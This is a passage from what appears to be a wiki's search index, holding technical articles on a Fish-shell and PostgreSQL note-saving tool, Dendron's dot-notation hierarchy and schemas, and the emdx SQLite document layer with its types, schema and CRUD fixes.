command.\"</p>"},{"location":"articles/claude-configfish-claudepsql-and-root-cause/#diagnostic-command","title":"Diagnostic Command","text":"<p>A <code>claude-check-setup</code> command was proposed to diagnose configuration issues:</p> <pre><code>function claude-check-setup\n    if functions -q __claude_psql\n        echo \"\u2705 __claude_psql found\"\n    else\n        echo \"\u274c __claude_psql missing - source claude-config.fish\"\n    end\n\n    if test -n \"$PGUSER\"\n        echo \"\u2705 Database user configured: $PGUSER\"\n    else\n        echo \"\u26a0\ufe0f  PGUSER not set\"\n    end\n\n    # Additional checks...\nend\n</code></pre>"},{"location":"articles/claude-configfish-claudepsql-and-root-cause/#related-topics","title":"Related Topics","text":""},{"location":"articles/claude-configfish-claudepsql-and-root-cause/#claude-list-simplification","title":"Claude-list Simplification","text":"<p>The <code>claude-list</code> command also suffered from sourcing issues. It used hardcoded credentials (<code>psql -U alexrockwell</code>) instead of the <code>__claude_psql</code> helper, preventing it from working on other machines.</p> <p>The fix involved:</p> <ol> <li>Replacing hardcoded <code>psql</code> calls with <code>__claude_psql</code></li> <li>Adding pagination and filtering options</li> <li>Implementing proper error handling</li> </ol>"},{"location":"articles/claude-configfish-claudepsql-and-root-cause/#completion-files-cleanup","title":"Completion Files Cleanup","text":"<p>The completion files in <code>completions/</code> directory still contain 13 instances of hardcoded database credentials. These need to be updated to use <code>__claude_psql</code> for consistency and security.</p>"},{"location":"articles/claude-configfish-claudepsql-and-root-cause/#mcp-postgresql-workaround","title":"MCP PostgreSQL Workaround","text":"<p>When <code>claude-save</code> fails due to sourcing issues, users can work around it by using the MCP PostgreSQL tool directly:</p> <pre><code>mcp__postgres-pro__execute_sql \"INSERT INTO claude.knowledge ...\"\n</code></pre> <p>This bypasses shell escaping issues but defeats the purpose of the claude command interface.</p> <p>Generated from 14 source documents</p>"},{"location":"articles/claude-find-claude-save-and-simplicity/","title":"claude-find, claude-save, and simplicity","text":""},{"location":"articles/claude-find-claude-save-and-simplicity/#overview","title":"Overview","text":"<p>The clauding project evolved through multiple architectural iterations, repeatedly learning the same lesson: simplicity beats features. This wiki documents the core commands (<code>claude-save</code>, <code>claude-find</code>), the journey from complexity to clarity, and the Fish plugin architecture that finally made the system \"just work.\"</p>"},{"location":"articles/claude-find-claude-save-and-simplicity/#key-concepts","title":"Key Concepts","text":""},{"location":"articles/claude-find-claude-save-and-simplicity/#the-core-workflow","title":"The Core Workflow","text":"<p>Clauding provides three essential operations:</p> <ol> <li>Save: <code>claude-save &lt;file&gt;</code> or <code>claude-clip</code> (from clipboard)</li> <li>Find: <code>claude-find &lt;search&gt;</code> or <code>claude-recent</code></li> <li>View: <code>claude-view &lt;id&gt;</code> with tab completion</li> </ol> <p>This mirrors the simplest knowledge capture workflow: save something, search for it later, read it when needed. The system is designed specifically for Claude Code workflows where building context through markdown files is essential.</p>"},{"location":"articles/claude-find-claude-save-and-simplicity/#search-first-architecture","title":"Search-First Architecture","text":"<p>PostgreSQL full-text search (FTS5) powers the find operation with: - GIN indexes for instant search - Weighted ranking (title vs content) - Auto-updating search vectors via triggers - Millisecond response times for thousands of documents</p> <p>The search vector updates automatically on every insert/update, requiring no manual index maintenance.</p>"},{"location":"articles/claude-find-claude-save-and-simplicity/#architecture-design-decisions","title":"Architecture &amp; Design Decisions","text":""},{"location":"articles/claude-find-claude-save-and-simplicity/#the-plugin-architecture-journey","title":"The Plugin Architecture Journey","text":"<p>Clauding underwent a major refactor from a manual-sourcing system to a standard Fish plugin. The transformation addressed critical pain points:</p> <p>Before (Manual Sourcing): - Required sourcing 3+ files in exact order - <code>claude-find</code> defined in 3 different files (standard, enhanced, scale) - Files named <code>*-fixed.fish</code> indicated hasty patches - Documentation referenced non-existent files like <code>core/claude-init.fish</code> - Broken installation scripts creating relative symlinks</p> <p>After (Plugin Mode):</p> <pre><code>clauding/\n\u251c\u2500\u2500 conf.d/\n\u2502   \u2514\u2500\u2500 clauding.fish          # Auto-loaded on shell start\n\u251c\u2500\u2500 functions/\n\u2502   \u251c\u2500\u2500 claude-save.fish       # One command per file\n\u2502   \u251c\u2500\u2500 claude-find.fish       \n\u2502   \u251c\u2500\u2500 claude-view.fish\n\u2502   \u2514\u2500\u2500 _clauding_internal/    # Internal functions, prefixed\n\u2502       \u251c\u2500\u2500 _clauding_db.fish\n\u2502       \u2514\u2500\u2500 _clauding_utils.fish\n\u2514\u2500\u2500 completions/\n    \u2514\u2500\u2500 clauding.fish\n</code></pre> <p>Key changes: - Zero manual sourcing via <code>conf.d/clauding.fish</code> auto-loading - No duplicate functions - merged 3 versions of <code>claude-find</code> into one with flags - Standard Fish structure following community conventions - Clean namespace with <code>_clauding_</code> prefix for internals - Easy installation via <code>./dev-install.fish</code> (now with absolute paths)</p>"},{"location":"articles/claude-find-claude-save-and-simplicity/#the-simplicity-principle","title":"The Simplicity Principle","text":"<p>Multiple design documents championed stripping away complexity:</p> <p>Version Tracking evolved from: - Complex metadata tables, content hashing, deduplication strategies, compression - To: Simple trigger storing old content before updates, full snapshots each time</p> <p>Document Relationships were planned but deferred until the core workflow proved insufficient.</p> <p>Categories and Tags were minimized in favor of full-text search across all content.</p> <p>The MVP document crystallized this philosophy:</p> <p>\"No complex tagging, no projects, no threading. Just save, find, view... You might not need anything else.\"</p>"},{"location":"articles/claude-find-claude-save-and-simplicity/#why-claude-code-agents-were-struggling","title":"Why Claude Code Agents Were Struggling","text":"<p>When the system moved to plugin mode without updating documentation, agents failed because: 1. <code>CLAUDE.md</code> referenced non-existent files (<code>core/claude-init.fish</code>) 2. <code>dev-install.fish</code> used relative paths: <code>set -l script_dir (dirname (status -f))</code> returned \".\" instead of absolute path 3. Broken symlinks appeared to install successfully but functions never loaded 4. Internal functions in <code>_clauding_internal/</code> weren't in Fish's function path</p> <p>The fix required three changes:</p> <pre><code># Fix in dev-install.fish\nset -l script_dir (realpath (dirname (status -f)))\n\n# Fix in conf.d/clauding.fish  \nset -l clauding_root (dirname (dirname (status -f)))\nif test -d $clauding_root/functions/_clauding_internal\n    set -p fish_function_path $clauding_root/functions/_clauding_internal\nend\n\n# Complete rewrite of CLAUDE.md to match plugin architecture\n</code></pre>"},{"location":"articles/claude-find-claude-save-and-simplicity/#implementation-details","title":"Implementation Details","text":""},{"location":"articles/claude-find-claude-save-and-simplicity/#minimal-schema","title":"Minimal Schema","text":"<pre><code>CREATE SCHEMA claude;\n\nCREATE TABLE claude.knowledge (\n    id SERIAL PRIMARY KEY,\n    title TEXT NOT NULL,\n    content TEXT NOT NULL,\n    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,\n    category TEXT DEFAULT 'general',\n    search_vector tsvector\n);\n\nCREATE INDEX idx_claude_created ON claude.knowledge(created_at DESC);\nCREATE INDEX idx_claude_search ON claude.knowledge USING GIN(search_vector);\n\nCREATE TRIGGER update_search_vector \nBEFORE INSERT OR UPDATE ON claude.knowledge\nFOR EACH ROW EXECUTE FUNCTION\ntsvector_update_trigger(search_vector, 'pg_catalog.english', title, content);\n</code></pre>"},{"location":"articles/claude-find-claude-save-and-simplicity/#function-consolidation","title":"Function Consolidation","text":"<p>The merged <code>claude-find</code> supports optional flags instead of maintaining separate implementations:</p> <pre><code>claude-find \"search term\"                    # Basic search\nclaude-find --snippets \"search term\"         # With context\nclaude-find --fuzzy \"search term\"            # Fuzzy matching\nclaude-find --project api --limit 5 \"term\"   # Filtered search\n</code></pre>"},{"location":"articles/claude-find-claude-save-and-simplicity/#auto-loading-via-confd","title":"Auto-Loading via conf.d","text":"<p>The <code>conf.d/clauding.fish</code> file loads automatically when Fish starts:</p> <pre><code># Set up database connection\nset -g CLAUDING_DB \"knowledge_base\"\nset -g CLAUDING_USER \"$USER\"\n\n# Define internal database function\nfunction _clauding_db\n    psql -U $CLAUDING_USER -d $CLAUDING_DB -t -A -c $argv\nend\n\n# Add internal functions to path\nset -l clauding_root (dirname (dirname (status -f)))\nif test -d $clauding_root/functions/_clauding_internal\n    set -p fish_function_path $clauding_root/functions/_clauding_internal\nend\n</code></pre> <p>This eliminates all manual sourcing requirements.</p>"},{"location":"articles/claude-find-claude-save-and-simplicity/#real-world-usage-flow","title":"Real-World Usage Flow","text":"<pre><code># Save a design document\n$ claude-save api-design-thoughts.md\n\u2713 Saved as #42\n\n# Search later\n$ claude-find \"api design\"\n42  api-design-thoughts.md     \"Thinking about REST vs GraphQL...\"\n41  api-authentication.md      \"JWT tokens vs sessions...\"\n\n# View with beautiful rendering\n$ claude-view 42\n\n# Quick save from clipboard\n$ claude-clip \"Docker compose for Postgres\"\n\u2713 Saved as #43\n\n# Review recent work\n$ claude-recent\n43  Docker compose for Postgres    (2 minutes ago)\n42  api-design-thoughts.md         (3 hours ago)\n</code></pre>"},{"location":"articles/claude-find-claude-save-and-simplicity/#related-topics","title":"Related Topics","text":""},{"location":"articles/claude-find-claude-save-and-simplicity/#the-personal-os-split","title":"The \"Personal OS\" Split","text":"<p>An early vision treated clauding as a \"Personal OS\" including email extraction, financial documents, and private document management. The recommendation was to split into:</p> <ol> <li>Claude-KB - Universal knowledge capture for Claude workflows (this project)</li> <li>Personal OS - Private email/financial systems</li> </ol> <p>The key insight: <code>claude-save</code> solved a specific problem (building context for Claude Code sessions) and diluting it with unrelated features would obscure that value.</p>"},{"location":"articles/claude-find-claude-save-and-simplicity/#distribution-strategy","title":"Distribution Strategy","text":"<p>Proposed paths to adoption: - Switch from PostgreSQL to SQLite for zero-config distribution - Single-file Fish function for easy sourcing - Multi-shell support (bash, zsh, Python CLI) - Fisher plugin: <code>fisher install arockwell/claude-kb</code></p> <p>The magic formula: Simple Install + Immediate Value + Claude Integration = Adoption</p>"},{"location":"articles/claude-find-claude-save-and-simplicity/#command-structure-patterns","title":"Command Structure Patterns","text":"<p>Analysis of command signatures revealed consistent patterns:</p> <p>Input sources: - File-based: <code>claude-save &lt;file&gt;</code> - Direct text: <code>claude-direct &lt;title&gt; &lt;content&gt;</code> - Piped: <code>echo \"text\" | claude-pipe &lt;title&gt;</code> - Clipboard: <code>claude-clip [title]</code> - Command output: <code>claude-cmd &lt;command&gt;</code></p> <p>Parameter patterns: - Positional arguments for primary inputs - Optional arguments with smart defaults - Auto-detection when parameters omitted (e.g., title from filename, project from git)</p> <p>This consistency makes the system intuitive: all commands follow <code>claude-&lt;verb&gt;</code> naming, and similar operations accept similar parameters.</p> <p>Generated from 10 source documents</p>"},{"location":"articles/dendron-hierarchy-system-flat-files-dot-notation-and-schema-driven-structure/","title":"Dendron Hierarchy System: Flat Files, Dot-Notation, and Schema-Driven Structure","text":""},{"location":"articles/dendron-hierarchy-system-flat-files-dot-notation-and-schema-driven-structure/#overview","title":"Overview","text":"<p>Dendron implements a hierarchy-first knowledge management system where structure is encoded entirely in flat filenames using dot-delimited notation. Instead of nested directories, every note is a single markdown file in a flat vault directory, with hierarchy represented by <code>.</code> separators in the filename. A note named <code>lang.python.basics.md</code> represents three hierarchy levels, with automatic parent-child relationships derived purely from filename parsing.</p> <p>This design enables powerful features: fuzzy hierarchical lookup, schema-based auto-completion, bulk refactoring with regex, and automatic stub generation for missing intermediate nodes\u2014all while maintaining human-readable file paths and git-friendly diffs.</p>"},{"location":"articles/dendron-hierarchy-system-flat-files-dot-notation-and-schema-driven-structure/#dot-notation-to-file-mapping","title":"Dot-Notation to File Mapping","text":"<p>Every note is a flat <code>.md</code> file. Hierarchy depth equals the number of dots plus one:</p> <pre><code>vault/\n\u251c\u2500\u2500 root.md                          # depth 0 (special root note)\n\u251c\u2500\u2500 lang.md                          # depth 1 (domain)\n\u251c\u2500\u2500 lang.python.md                   # depth 2\n\u251c\u2500\u2500 lang.python.basics.md            # depth 3\n\u251c\u2500\u2500 lang.python.advanced.md          # depth 3\n\u2514\u2500\u2500 lang.go.md                       # depth 2\n</code></pre> <p>Core string operations (implemented in <code>dnode.ts</code>):</p> <pre><code>// Parent path: strip last segment\ndirName(\"lang.python.basics\") \u2192 \"lang.python\"\n\n// Basename: extract leaf segment  \nbasename(\"lang.python.basics\") \u2192 \"basics\"\n\n// Domain: first segment\ndomainName(\"lang.python.basics\") \u2192 \"lang\"\n\n// Depth calculation\ngetFNameDepth(\"lang.python.basics\") \u2192 3\n</code></pre> <p>Parent-child relationships are determined by string prefix matching: note A is the parent of note B if <code>B.fname</code> starts with <code>A.fname + \".\"</code> and no intermediate note exists. Internally, these relationships are stored as UUID pointer arrays (<code>parent: string</code>, <code>children: string[]</code>) in an in-memory note dictionary, not as nested data structures.</p>"},{"location":"articles/dendron-hierarchy-system-flat-files-dot-notation-and-schema-driven-structure/#automatic-stub-generation","title":"Automatic Stub Generation","text":"<p>When creating <code>lang.python.basics</code> while parent notes don't exist, Dendron auto-creates stub notes\u2014in-memory placeholders that appear in the tree view with a <code>+</code> icon but write no files to disk.</p> <p>Algorithm (from <code>NoteUtils.createStubs</code>):</p> <ol> <li>Compute parent path: <code>lang.python.basics</code> \u2192 parent is <code>lang.python</code></li> <li>Look up <code>lang.python</code> in note dictionary</li> <li>If not found, recursively walk up: <code>lang.python</code> \u2192 <code>lang</code> \u2192 <code>root</code></li> <li>Find closest existing ancestor (e.g., <code>root</code>)</li> <li>Split the gap path: <code>[\"lang\", \"python\"]</code></li> <li>Create a stub for each intermediate segment with <code>stub: true</code> flag</li> <li>Wire up parent/child UUID links</li> </ol> <p>Stubs materialize into real files only when clicked or when a user explicitly creates them. When deleting a note with children, Dendron replaces it with a stub to preserve hierarchy integrity.</p>"},{"location":"articles/dendron-hierarchy-system-flat-files-dot-notation-and-schema-driven-structure/#note-frontmatter-structure","title":"Note Frontmatter Structure","text":"<p>Every note has YAML frontmatter with required and optional fields:</p> <p>Required fields:</p> <pre><code>---\nid: 4RFQMNA91cRW12VJl_PFd          # 23-char UUID\ntitle: Taking Notes                 # Auto-generated from fname via title-case\ndesc: Creating notes                # Description (default: \"\")\nupdated: 1639425310320              # Unix timestamp (ms)\ncreated: 1625563944736              # Unix timestamp (ms)\n---\n</code></pre> <p>Common optional fields:</p> Field Purpose <code>nav_order</code> Numeric sort order in navigation <code>stub</code> Internal flag (excluded from file write) <code>config</code> Local config overrides <code>tags</code> Frontmatter tags (string or array) <code>image</code> Social media preview thumbnail <code>traitIds</code> Note trait behaviors <p>Internal fields (tracked by engine, not serialized):</p> Field Description <code>fname</code> Filename/hierarchy path (<code>lang.python.basics</code>) <code>parent</code> UUID of immediate parent <code>children</code> Array of child note UUIDs <code>body</code> Markdown content below frontmatter <code>links</code> Extracted wikilinks, backlinks, refs <code>schema</code> Applied schema module and ID <code>vault</code> Vault reference <p>Title auto-generation: The <code>title</code> field is generated from the basename via title-casing: <code>lang.python.basics</code> \u2192 basename <code>\"basics\"</code> \u2192 title <code>\"Basics\"</code>. Hyphens convert to spaces: <code>my-cool-note</code> \u2192 <code>\"My Cool Note\"</code>.</p>"},{"location":"articles/dendron-hierarchy-system-flat-files-dot-notation-and-schema-driven-structure/#schema-system","title":"Schema System","text":"<p>Schemas are YAML files (<code>{name}.schema.yml</code>) that define expected hierarchy shapes using glob patterns. They are entirely optional\u2014notes without matching schemas work fine, just with a <code>?</code> marker in the tree view.</p> <p>Complete YAML format:</p> <pre><code>version: 1\nimports:                    # Import other schema files (v1 only)\n  - other_schema\n\nschemas:\n  - id: daily               # REQUIRED: unique ID, used as glob pattern\n    title: \"Daily Journal\"  # Display name in lookup\n    desc: \"Daily notes\"     # Human-readable description\n    parent: root            # At least one schema must have parent: root\n    namespace: true         # Auto-match immediate children\n    pattern: \"[0-9]*\"       # Bash glob override (default: uses id)\n    children:               # Child schema IDs\n      - journal\n    template:               # Auto-apply template to matching notes\n      id: templates.daily\n      type: note\n</code></pre> <p>Key fields:</p> Field Required Default Purpose <code>id</code> Yes \u2014 Unique ID; doubles as literal glob pattern if <code>pattern</code> not set <code>parent</code> Special \u2014 Must be <code>root</code> for at least one schema (the domain) <code>pattern</code> No id value Bash extended glob for matching note names <code>namespace</code> No false Auto-matches immediate children (not recursive) <code>children</code> No \u2014 List of child schema IDs <code>template</code> No \u2014 Template note to auto-insert on creation <p>Inline schema syntax (compact nested definitions):</p> <pre><code>version: 1\nschemas:\n  - id: daily\n    parent: root\n    children:\n      - pattern: journal\n        children:\n          - pattern: \"[0-2][0-9][0-9][0-9]\"    # year\n            children:\n              - pattern: \"[0-1][0-9]\"          # month\n                children:\n                  - pattern: \"[0-3][0-9]\"      # day\n                    template: templates.daily\n</code></pre>"},{"location":"articles/dendron-hierarchy-system-flat-files-dot-notation-and-schema-driven-structure/#pattern-matching-and-templates","title":"Pattern Matching and Templates","text":"<p>Schemas use Bash extended glob syntax (not regex):</p> Pattern Matches <code>*</code> Zero or more characters <code>[0-9]</code> Single digit <code>*([0-9])</code> Zero or more digits <code>+([0-9])</code> One or more digits <code>@(left\\|right)</code> Exactly \"left\" or \"right\" <code>!(temp\\|scratch)</code> Anything except listed terms <p>Template auto-application flow:</p> <ol> <li>Schema defines pattern <code>[0-3][0-9]</code> with <code>template: templates.daily</code></li> <li>User creates note <code>daily.journal.2024.01.15</code></li> <li>Engine walks hierarchy, matching each segment against schema patterns</li> <li>When day segment matches, content from <code>templates.daily.md</code> is auto-inserted</li> </ol> <p>Namespace behavior: Setting <code>namespace: true</code> automatically matches the schema node itself plus immediate children only (not recursive depth). The pattern becomes <code>{id}.*</code>:</p> Note Match? <code>meet</code> Yes (exact) <code>meet.standup</code> Yes (immediate child) <code>meet.standup.notes</code> No (depth 3, too deep)"},{"location":"articles/dendron-hierarchy-system-flat-files-dot-notation-and-schema-driven-structure/#schema-validation-model","title":"Schema Validation Model","text":"<p>Schemas are suggestive, not enforcing\u2014they implement an \"optional type system.\"</p> <p>What schemas DO: - Auto-suggest valid child names during lookup (schema completions with <code>+</code> icon) - Auto-apply template content to matching notes - Display schema icons next to conforming notes - Show <code>?</code> icon for notes without schema matches</p> <p>What schemas do NOT do: - Block creation of non-conforming notes - Prevent arbitrary note names - Enforce required children - Throw errors on schema violations</p> <p>You can freely create <code>daily.journal.banana</code> even when the schema expects <code>[0-9][0-9]</code>\u2014you simply won't get auto-completion or template insertion.</p>"},{"location":"articles/dendron-hierarchy-system-flat-files-dot-notation-and-schema-driven-structure/#publishing-configuration","title":"Publishing Configuration","text":"<p>Dendron uses a custom Next.js static site generator with per-hierarchy publishing control via <code>dendron.yml</code>:</p> <pre><code>publishing:\n  siteHierarchies:              # Which top-level domains to publish\n    - dendron\n    - community\n  siteIndex: dendron\n  hierarchy:\n    someHierarchy:\n      publishByDefault: false   # Require explicit published: true\n      customFrontmatter:        # Inject into all notes in hierarchy\n        - key: \"toc\"\n          value: true\n</code></pre> <p>Per-note frontmatter controls:</p> Field Purpose <code>published</code> Set to <code>false</code> to exclude from site (default: <code>true</code>) <code>nav_order</code> Numeric ordering in navigation sidebar <code>nav_exclude</code> Hide from nav but still publish the page <code>noindex</code> Adds <code>noindex, nofollow</code> meta tag <code>has_collection</code> List children instead of rendering note body <code>skipLevels</code> Skip N hierarchy levels in collection display <code>permalink</code> Custom URL path override <p>Generated site structure: - Left sidebar: Collapsible hierarchical tree navigation - Main content: Rendered markdown note body - Right sidebar: Auto-generated table of contents from headers - Search bar: Combined lookup (<code>/</code> prefix) and full-text search (<code>?</code> prefix) - Permanent ID URLs: URLs use note UUIDs, never break on rename</p>"},{"location":"articles/dendron-hierarchy-system-flat-files-dot-notation-and-schema-driven-structure/#refactoring-operations","title":"Refactoring Operations","text":"<p>Rename Note (<code>Dendron: Rename Note</code> or F2): - Renames single note file - Updates all wikilinks and backlinks workspace-wide - Regenerates auto-generated titles; preserves custom titles - Does not rename child notes (only the single targeted note)</p> <p>Move Note (<code>Dendron: Move Note</code>): - Moves notes between vaults in multi-vault workspaces - Can move parent + all children simultaneously via toggle - Updates all backlinks to moved notes - Cannot overwrite existing notes at destination</p> <p>Refactor Hierarchy (<code>Dendron: Refactor Hierarchy</code>): - Bulk rename using JavaScript regex with capture groups - Example: Match <code>(dendron)\\.(.*)</code>, replace with <code>awesome.$2.$1</code>   - Transforms <code>dendron.foo</code> \u2192 <code>awesome.foo.dendron</code> - Shows preview of all changes before execution - Refuses to proceed if any rename creates a conflict</p>"},{"location":"articles/dendron-hierarchy-system-flat-files-dot-notation-and-schema-driven-structure/#real-world-schema-examples","title":"Real-World Schema Examples","text":"<p>Daily Journal with Meeting Notes:</p> <pre><code>version: 1\nschemas:\n  - id: daily\n    parent: root\n    children: [journal]\n\n  - id: journal\n    children: [year]\n\n  - id: year\n    pattern: \"[0-2][0-9][0-9][0-9]\"\n    children: [month]\n\n  - id: month\n    pattern: \"[0-1][0-9]\"\n    children: [day]\n\n  - id: day\n    pattern: \"[0-3][0-9]\"\n    template: \n      id: template.daily\n      type: note\n    children: [meet, note]\n\n  - id: meet\n    desc: \"Meeting Notes\"\n    namespace: true\n    template:\n      id: template.meeting\n      type: note\n</code></pre> <p>Topic/Knowledge Schema with Namespace:</p> <pre><code>version: 1\nschemas:\n  - id: leadership\n    desc: \"Leadership topics\"\n    parent: root\n    namespace: true       # Matches leadership.* (any subtopic)\n    children:\n      - books\n\n  - id: books\n    desc: \"Book notes\"\n    namespace: true       # Matches leadership.books.* (any book)\n</code></pre> <p>This schema structure allows arbitrary note creation under <code>leadership</code> (e.g., <code>leadership.delegation</code>, <code>leadership.feedback</code>) while still providing schema-based templates for the <code>books</code> sub-hierarchy.</p> <p>Generated from 11 source documents</p>"},{"location":"articles/documentspy-emdx-models-and-database-layer/","title":"documents.py: emdx Models and Database Layer","text":""},{"location":"articles/documentspy-emdx-models-and-database-layer/#overview","title":"Overview","text":"<p>The emdx knowledge base uses a layered architecture where the database layer (<code>emdx/database/</code>) handles raw SQL operations and the models layer (<code>emdx/models/</code>) provides business logic and re-exports. The <code>documents.py</code> module is the centerpiece, managing document CRUD operations, relationships, and full-text search integration.</p> <p>Core responsibilities: - Document lifecycle: create, read, update, soft delete, restore - Parent-child relationships with lineage tracking (\"supersedes\", \"exploration\", \"variant\") - FTS5 full-text search integration via virtual tables - Access tracking (timestamps and counts) - Project-based scoping</p>"},{"location":"articles/documentspy-emdx-models-and-database-layer/#key-files","title":"Key Files","text":"<pre><code>emdx/\n\u251c\u2500\u2500 models/\n\u2502   \u251c\u2500\u2500 types.py              # Model layer TypedDicts (tasks, categories, tags)\n\u2502   \u251c\u2500\u2500 documents.py          # Re-exports database layer document functions\n\u2502   \u251c\u2500\u2500 tasks.py              # Task operations with epic/dependency management\n\u2502   \u251c\u2500\u2500 tags.py               # Tag normalization and search\n\u2502   \u2514\u2500\u2500 categories.py         # Task category management\n\u251c\u2500\u2500 database/\n\u2502   \u251c\u2500\u2500 types.py              # Database layer TypedDicts (documents, cascade, groups)\n\u2502   \u251c\u2500\u2500 documents.py          # Core document CRUD with SQL operations\n\u2502   \u251c\u2500\u2500 search.py             # FTS5 search queries\n\u2502   \u251c\u2500\u2500 cascade.py            # Cascade pipeline stage tracking\n\u2502   \u2514\u2500\u2500 groups.py             # Document grouping and hierarchy\n</code></pre>"},{"location":"articles/documentspy-emdx-models-and-database-layer/#type-system-architecture","title":"Type System Architecture","text":""},{"location":"articles/documentspy-emdx-models-and-database-layer/#typeddict-strategy","title":"TypedDict Strategy","text":"<p>As of PRs #603 and #606, the codebase has migrated from <code>dict[str, Any]</code> to concrete TypedDicts, providing: - Type safety: Catch key access errors at lint time - IDE autocompletion for dictionary keys - Self-documenting schemas - Refactoring confidence across the codebase</p> <p>Design principle: Types are defined close to where they're returned. Models layer types live in <code>models/types.py</code>, database layer types in <code>database/types.py</code>.</p>"},{"location":"articles/documentspy-emdx-models-and-database-layer/#core-document-types","title":"Core Document Types","text":"<p>DocumentRow (full record with cascade metadata):</p> <pre><code>class DocumentRow(TypedDict):\n    id: int\n    title: str\n    content: str\n    project: str | None\n    created_at: str | None\n    updated_at: str | None\n    accessed_at: str | None\n    access_count: int\n    deleted_at: str | None\n    is_deleted: int              # SQLite boolean (0/1)\n    parent_id: int | None\n    relationship: str | None     # \"supersedes\" | \"exploration\" | \"variant\"\n    archived_at: str | None\n    stage: str | None            # \"idea\" | \"prompt\" | \"analyzed\" | \"planned\" | \"done\"\n</code></pre> <p>DocumentListItem (lightweight for list views):</p> <pre><code>class DocumentListItem(TypedDict):\n    id: int\n    title: str\n    project: str | None\n    created_at: str | None\n    access_count: int\n    parent_id: int | None\n    relationship: str | None\n</code></pre> <p>DocumentGroup (document grouping):</p> <pre><code>class DocumentGroup(TypedDict):\n    id: int\n    name: str\n    description: str | None\n    parent_group_id: int | None\n    is_active: int\n    is_deleted: int\n    created_at: str | None\n</code></pre>"},{"location":"articles/documentspy-emdx-models-and-database-layer/#type-system-conventions","title":"Type System Conventions","text":"<p>Boolean fields \u2014 SQLite stores booleans as integers (0/1):</p> <pre><code>is_deleted: int    # NOT bool\nis_active: int     # NOT bool\n</code></pre> <p>Datetime fields \u2014 SQLite returns ISO8601 strings:</p> <pre><code>created_at: str | None    # NOT datetime\nupdated_at: str | None    # NOT datetime\n</code></pre> <p>Literal types for enums:</p> <pre><code>TaskStatus = Literal['open', 'active', 'blocked', 'done', 'failed']\nCascadeStage = Literal['idea', 'prompt', 'analyzed', 'planned', 'done']\n</code></pre> <p>TypedDict inheritance:</p> <pre><code>class EpicTaskDict(TaskDict):\n    child_count: int\n    children_open: int\n    children_done: int\n</code></pre> <p>SQL parameter lists \u2014 After audit #6440:</p> <pre><code>params: list[str | int | None] = []  # NOT list[Any]\n</code></pre> <p>SQLite Row conversion \u2014 Requires type ignores:</p> <pre><code>return cast(TaskDict, dict(row))  # type: ignore[arg-type, return-value]\n</code></pre>"},{"location":"articles/documentspy-emdx-models-and-database-layer/#database-schema","title":"Database Schema","text":""},{"location":"articles/documentspy-emdx-models-and-database-layer/#documents-table-migration-001","title":"Documents Table (Migration 001)","text":"<pre><code>CREATE TABLE documents (\n    id INTEGER PRIMARY KEY,\n    title TEXT NOT NULL,\n    content TEXT NOT NULL,\n    project TEXT,\n    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,\n    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,\n    accessed_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,\n    access_count INTEGER DEFAULT 0,\n    deleted_at TIMESTAMP,\n    is_deleted BOOLEAN DEFAULT 0,\n    parent_id INTEGER REFERENCES documents(id),\n    relationship TEXT,  -- \"supersedes\" | \"exploration\" | \"variant\"\n    archived_at TIMESTAMP,\n    stage TEXT  -- Migration 028: cascade workflow\n)\n</code></pre>"},{"location":"articles/documentspy-emdx-models-and-database-layer/#fts5-virtual-table-migration-002","title":"FTS5 Virtual Table (Migration 002)","text":"<pre><code>CREATE VIRTUAL TABLE documents_fts USING fts5(\n    title, content, project,\n    content=documents, content_rowid=id\n)\n</code></pre> <p>Critical FTS5 gotcha: <code>documents_fts</code> is a separate virtual table, NOT a column on <code>documents</code>. You must JOIN it:</p> <pre><code>-- \u274c WRONG: \"no such column\" error\nSELECT id FROM documents WHERE documents_fts MATCH ?\n\n-- \u2705 CORRECT: JOIN pattern\nSELECT d.id FROM documents d\nJOIN documents_fts fts ON d.id = fts.rowid\nWHERE fts.documents_fts MATCH ?\n</code></pre> <p>See <code>emdx/database/search.py</code> for the canonical pattern (documented in CLAUDE.md known gotchas).</p>"},{"location":"articles/documentspy-emdx-models-and-database-layer/#tags-schema","title":"Tags Schema","text":"<pre><code>CREATE TABLE tags (\n    id INTEGER PRIMARY KEY,\n    name TEXT UNIQUE,\n    emoji TEXT\n);\n\nCREATE TABLE document_tags (\n    document_id INTEGER REFERENCES documents(id),\n    tag_id INTEGER REFERENCES tags(id),\n    UNIQUE(document_id, tag_id)\n);\n</code></pre>"},{"location":"articles/documentspy-emdx-models-and-database-layer/#core-document-operations","title":"Core Document Operations","text":""},{"location":"articles/documentspy-emdx-models-and-database-layer/#document-crud-databasedocumentspy","title":"Document CRUD (<code>database/documents.py</code>)","text":"<p>save_document():</p> <pre><code>def save_document(\n    title: str,\n    content: str,\n    project: str | None = None,\n    tags: list[str] | None = None,\n    parent_id: int | None = None,\n    relationship: str | None = None,\n    conn: sqlite3.Connection | None = None\n) -&gt; int\n</code></pre> <p>Originally committed after INSERT, then called <code>add_tags_to_document()</code> in a separate transaction \u2014 creating an atomicity bug. Fixed in PR #594 to pass the same connection:</p> <pre><code># Before: commit happened here, before tagging\ndoc_id = cursor.lastrowid\nconn.commit()  # \u274c Too early\nif tags:\n    add_tags_to_document(doc_id, tags)  # Separate transaction\n\n# After: commit happens after tags\ndoc_id = cursor.lastrowid\nif tags:\n    add_tags_to_document(doc_id, tags, conn=conn)  # Same transaction\nconn.commit()  # \u2705 Atomic\n</code></pre> <p>get_document():</p> <pre><code>def get_document(doc_id: int) -&gt; DocumentRow | None\n</code></pre> <p>Returns None when record not found. Auto-updates <code>accessed_at</code> timestamp and increments <code>access_count</code> on every retrieval.</p> <p>update_document():</p> <pre><code>def update_document(doc_id: int, **kwargs) -&gt; bool\n</code></pre> <p>Whitelist-validated partial updates. Invalid columns raise <code>ValueError</code>.</p> <p>delete_document() / restore_document():</p> <pre><code>def delete_document(doc_id: int) -&gt; bool  # Sets deleted_at timestamp\ndef restore_document(doc_id: int) -&gt; bool  # Clears deleted_at\n</code></pre> <p>Soft deletion via nullable <code>deleted_at</code> column.</p> <p>list_documents():</p> <pre><code>def list_documents(\n    project: str | None = None,\n    tags: list[str] | None = None,\n    status: str | None = None,\n    limit: int = 100,\n    offset: int = 0\n) -&gt; list[DocumentListItem]\n</code></pre> <p>Validates <code>limit &gt;= 0</code> and <code>offset &gt;= 0</code> (PR #594). Without this, <code>LIMIT -1</code> means \"no limit\" in SQLite \u2014 a DoS 